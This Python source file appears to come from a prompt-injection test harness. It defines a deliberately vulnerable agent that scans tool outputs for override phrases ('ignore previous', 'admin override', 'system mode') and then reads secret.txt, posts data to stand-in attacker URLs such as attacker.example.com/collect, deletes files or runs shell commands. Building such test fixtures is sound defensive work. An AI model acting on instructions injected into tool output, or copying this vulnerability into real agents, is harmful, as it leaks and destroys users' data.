from __future__ import annotations

import re
from typing import Any, Optional

from ..core.trace import Trace

_URL_RE = re.compile(r'https?://[^\s\'"<>]+')
_INSTRUCTION_RESET_PHRASES = ("ignore previous", "forget", "disregard", "overlook")
_IMPERATIVE_PHRASES = ("you must", "immediately", "execute", "required", "mandatory")
_AUTHORITY_PHRASES = (
    "system mode",
    "admin override",
    "god",
    "law enforcement",
    "fbi",
    "developer",
    "ceo",
)
_STEP_MARKERS = ("step 1", "1.", "first,")
_OPEN_PAGE_IDS = (
    "ignore_prev_1",
    "ignore_prev_2",
    "ignore_prev_3",
    "ignore_prev_4",
    "indirect_ref_1",
    "indirect_ref_2",
    "social_eng_1",
    "system_mode_1",
    "payload_injection_1",
    "chain_attack_1",
    "prompt_injection_demo",
)
_READ_FILE_TARGETS = (
    ("backup", "backup.txt"),
    ("config", "config.txt"),
    ("install", "install.txt"),
    ("package", "package.txt"),
    ("readme", "readme.txt"),
    ("note", "note.txt"),
    ("report", "report.txt"),
    ("secret", "secret.txt"),
)


class VulnerableDeterministicAgent:
    """
    A deterministic agent vulnerable to real prompt injections.
    It naively parses instructions from tool outputs and follows them.
    """

    def _tool_call(self, tool: str, args: dict[str, Any], reason: str) -> dict[str, Any]:
        return {"tool": tool, "args": args, "reason": reason}

    def _find_url(self, output: str) -> Optional[str]:
        match = _URL_RE.search(output)
        if match is None:
            return None
        return match.group(0)

    def _read_file_call(self, message: str) -> Optional[dict[str, Any]]:
        for keyword, path in _READ_FILE_TARGETS:
            if keyword in message:
                return self._tool_call("fs.read", {"path": path}, "read_file")
        if "file" in message:
            return self._tool_call("fs.read", {"path": "secret.txt"}, "read_file")
        return None

    def _extract_open_page_id(self, message: str) -> str:
        for word in message.split():
            clean_word = word.strip(".,!?")
            if "_" in clean_word or clean_word in ("demo", "welcome", "howto"):
                return clean_word

        normalized_message = message.replace(" ", "_")
        for page_id in _OPEN_PAGE_IDS:
            if page_id in normalized_message:
                return page_id

        return "welcome"

    def _extract_email_id(self, message: str) -> str:
        for word in message.split():
            clean_word = word.strip(".,!?")
            if clean_word.startswith("msg"):
                return clean_word
        return "msg1"

    def _parse_instructions_from_output(self, output: str) -> Optional[dict[str, Any]]:
        """Parse instructions from untrusted tool output (VULNERABILITY!)"""
        if not output:
            return None

        output_lower = output.lower()

        # Vulnerable: follows "ignore/forget previous instructions" + specific actions
        if any(phrase in output_lower for phrase in _INSTRUCTION_RESET_PHRASES):
            # Priority 1: Read secret (most common injection)
            if ("read" in output_lower or "access" in output_lower) and "secret" in output_lower:
                return self._tool_call(
                    "fs.read",
                    {"path": "secret.txt"},
                    "followed_injected_instruction",
                )
            # Priority 2: Exfiltration
            if "http.post" in output_lower or (
                "post" in output_lower and "https://" in output_lower
            ):
                url = self._find_url(output) or "https://attacker.example.com/collect"
                return self._tool_call(
                    "http.post",
                    {"url": url, "data": "SECRET_MARKER"},
                    "followed_injected_instruction",
                )
            # Priority 3: Delete
            if "delete" in output_lower and "secret" in output_lower:
                return self._tool_call(
                    "fs.delete",
                    {"path": "secret.txt"},
                    "followed_injected_instruction",
                )
            # Priority 4: Shell
            if "shell" in output_lower or ("run" in output_lower and "command" in output_lower):
                return self._tool_call(
                    "shell.run",
                    {"cmd": "whoami"},
                    "followed_injected_instruction",
                )

        # Vulnerable: follows imperative commands
        if any(phrase in output_lower for phrase in _IMPERATIVE_PHRASES):
            # Look for specific actions mentioned
            if ("read" in output_lower or "access" in output_lower) and (
                "secret" in output_lower or "credential" in output_lower
            ):
                return self._tool_call("fs.read", {"path": "secret.txt"}, "followed_command")
            if (
                "send" in output_lower or "transmit" in output_lower or "post" in output_lower
            ) and "https://" in output_lower:
                matched_url = self._find_url(output)
                if matched_url is not None:
                    return self._tool_call(
                        "http.post",
                        {"url": matched_url, "data": "EXFILTRATED"},
                        "followed_command",
                    )
            if "delete" in output_lower and "secret" in output_lower:
                return self._tool_call("fs.delete", {"path": "secret.txt"}, "followed_command")
            if ("shell" in output_lower or "run" in output_lower) and (
                "verification" in output_lower
                or "diagnostic" in output_lower
                or "command" in output_lower
            ):
                return self._tool_call("shell.run", {"cmd": "whoami"}, "followed_command")

        # Vulnerable: follows system mode / authority claims
        if any(phrase in output_lower for phrase in _AUTHORITY_PHRASES):
            # Authority bypass: Read secret
            if "read" in output_lower or "access" in output_lower or "audit" in output_lower:
                return self._tool_call("fs.read", {"path": "secret.txt"}, "followed_authority")
            # Authority bypass: Exfiltrate
            if (
                "send" in output_lower or "transmit" in output_lower or "report" in output_lower
            ) and "https://" in output_lower:
                matched_url = self._find_url(output)
                if matched_url is not None:
                    return self._tool_call(
                        "http.post",
                        {"url": matched_url, "data": "AUTHORITY_BYPASS"},
                        "followed_authority",
                    )

        # Vulnerable: follows numbered instructions
        if any(marker in output_lower for marker in _STEP_MARKERS):
            # Look for fs.read in step 1
            if "read" in output_lower and (
                "secret" in output_lower or "credential" in output_lower or ".txt" in output_lower
            ):
                return self._tool_call("fs.read", {"path": "secret.txt"}, "followed_steps")
            # Look for other operations
            if "post" in output_lower or "send" in output_lower:
                return self._tool_call(
                    "http.post",
                    {
                        "url": "https://step-collector.example.com/data",
                        "data": "STEP_FOLLOW",
                    },
                    "followed_steps",
                )

        return None

    def next_tool_call(
        self, trace: Trace, last_tool_output: Optional[str]
    ) -> Optional[dict[str, Any]]:
        # VULNERABILITY: Parse tool outputs for injected instructions FIRST
        if last_tool_output and len(last_tool_output) > 20:
            injected_call = self._parse_instructions_from_output(last_tool_output)
            if injected_call:
                return injected_call

        # Otherwise, use simple heuristics from last user message
        if not trace.user_messages:
            return None

        u = trace.user_messages[-1].lower()

        if "search" in u:
            q = u.split("search", 1)[-1].strip() or "welcome"
            return self._tool_call("web.search", {"query": q}, "user_requested_search")
        if "open" in u:
            page_id = self._extract_open_page_id(u)
            return self._tool_call("web.open", {"id": page_id}, "user_requested_open")
        if "read email" in u or "email" in u:
            msg_id = self._extract_email_id(u)
            return self._tool_call("email.read", {"id": msg_id}, "read_email")
        if "read" in u:
            read_call = self._read_file_call(u)
            if read_call is not None:
                return read_call
        if "write" in u or "save" in u:
            return self._tool_call(
                "fs.write",
                {"path": "note.txt", "content": "demo"},
                "write_file",
            )
        if "delete" in u:
            return self._tool_call("fs.delete", {"path": "secret.txt"}, "delete_file")
        if "shell" in u or ("run" in u and "echo" in u):
            return self._tool_call("shell.run", {"cmd": "echo TEST"}, "run_command")
        if "send" in u and "email" in u:
            return self._tool_call(
                "email.send",
                {"to": "test@example.invalid", "subject": "demo", "body": "hi"},
                "send_email",
            )
        if "upload" in u or "post" in u:
            return self._tool_call(
                "http.post",
                {"url": "https://example.invalid/collect", "data": "demo"},
                "post_data",
            )

        return None
